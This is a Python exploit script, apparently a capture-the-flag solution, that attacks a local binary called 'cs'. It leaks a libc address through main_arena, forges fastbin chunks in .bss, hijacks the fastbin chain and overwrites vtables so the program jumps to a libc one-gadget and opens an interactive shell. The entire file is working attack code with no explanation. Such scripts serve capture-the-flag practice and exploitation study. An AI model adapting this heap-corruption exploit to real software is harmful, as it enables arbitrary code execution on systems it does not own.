#!/usr/bin/env python2.7
# -*- coding:utf-8 -*-
from mkpwn import *

# settings
local   = True
debug   = False

if local:
    target  = './cs'
else:
    target  = ('0', 0)

# get io
io  = mk(target, debug)

# global
base_adr = 0x6061f0
vuln_adr = 0x400e76

fake_fast = lambda fwd: l64(0x0) + l64(0x40) + l64(fwd) + 'A' * 0x28

# exp
def exp():
    io.ru('Your name:')
    io.pr()
    io.ru('Your Description:')
    io.pr()

    io.pr(['m', 1] + ['m', 'y', 1] * 6)

    io.pr('y', 0x80)
    io.ru('To ALL:')
    io.pr()

    io.pr('y', 0x70)
    io.ru('To ALL:')
    io.pr('A' * 1)
    io.ru('A' * 1)
    main_arena_adr  = l64(('\x60' + io.rl()[:-1]).ljust(0x8, '\x00'))
    libc_system_adr = 0x7f68a38b0640 - 0x7f68a3c28760 + main_arena_adr
    libc_magic_adr  = 0xe58c5 - 0x46640 + libc_system_adr
    info_found('main arena', main_arena_adr)
    info_found('libc system', libc_system_adr)

    # in buffer @.bss
    payload  = 'A' * 0x40
    payload += fake_fast(base_adr + 0x250)
    payload  = payload.ljust(0x250, 'A')
    payload += fake_fast(0x0)
    payload += l64(0x0) + l64(0x40)
    io.pr('~', 'rename')
    io.pr(payload)
    io.pr('exit')

    io.pr(['m', 'y', 1]*3)

    # hijack fastbin chain
    payload  = 'A' * 0x10
    payload += l64(0x0) + l64(0x40)
    payload += l64(0x0)
    payload  = payload.ljust(0x70, 'A')
    payload += l64(0x0) + l64(0x40) + l64(base_adr + 0x40)
    io.pr('y', 0x70)
    io.ru('To ALL:')
    io.pr(payload)

    io.pr(['m', 'y', 1]*3)

    # get object @.bss
    io.pr(['m', 'y', 1])

    # overwrite vtable of object 
    payload  = 'A' * 0x8
    payload += l64(vuln_adr)
    payload  = payload.ljust(0x40, 'A')
    payload += l64(0x0) + l64(0x40) + l64(base_adr)
    io.pr('~', 'rename')
    io.pr(payload)
    io.pr('exit')

    # overwrite global vtable & call vuln
    payload  = 'A' * 0x50
    payload += l64(base_adr)
    # io.hint([0x401d1f])
    io.pr('y', 0x30)
    io.ru('To ALL:')
    io.pr(payload)

    payload  = 'A' * 0x14 
    payload += l64(libc_magic_adr)
    payload  = payload.ljust(0x200, '\x00')
    io.pr(payload)

    info_shell()
    io.interact()

# main
if __name__ == '__main__':
    exp()
